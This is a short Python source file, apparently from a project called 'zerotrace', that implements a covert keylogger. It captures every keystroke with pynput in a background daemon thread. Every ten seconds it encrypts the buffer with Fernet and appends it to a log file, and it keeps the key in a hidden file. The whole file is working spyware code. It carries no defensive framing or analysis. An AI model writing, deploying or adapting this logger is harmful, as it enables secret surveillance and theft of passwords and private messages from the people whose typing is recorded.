import pynput.keyboard
import threading
from cryptography.fernet import Fernet
import os

# Path to store key logs and key
LOG_FILE = "zerotrace/logger/keystrokes.log"
KEY_FILE = "zerotrace/logger/.key"

# Generate or load encryption key
def get_encryption_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as f:
            return f.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as f:
            f.write(key)
        return key

key = get_encryption_key()
cipher = Fernet(key)

# Silent logger
class EncryptedKeyLogger:
    def __init__(self):
        self.log = ""
        self.listener = pynput.keyboard.Listener(on_press=self.on_press)
    
    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            current_key = f"[{key.name}]"
        self.log += current_key

    def encrypt_and_save(self):
        if self.log:
            encrypted_data = cipher.encrypt(self.log.encode())
            with open(LOG_FILE, 'ab') as f:
                f.write(encrypted_data + b"\n")
            self.log = ""

    def run(self):
        with self.listener:
            while True:
                self.encrypt_and_save()
                threading.Event().wait(10)  # Encrypt & save every 10s

if __name__ == "__main__":
    logger = EncryptedKeyLogger()
    background_thread = threading.Thread(target=logger.run)
    background_thread.daemon = True
    background_thread.start()
    background_thread.join()
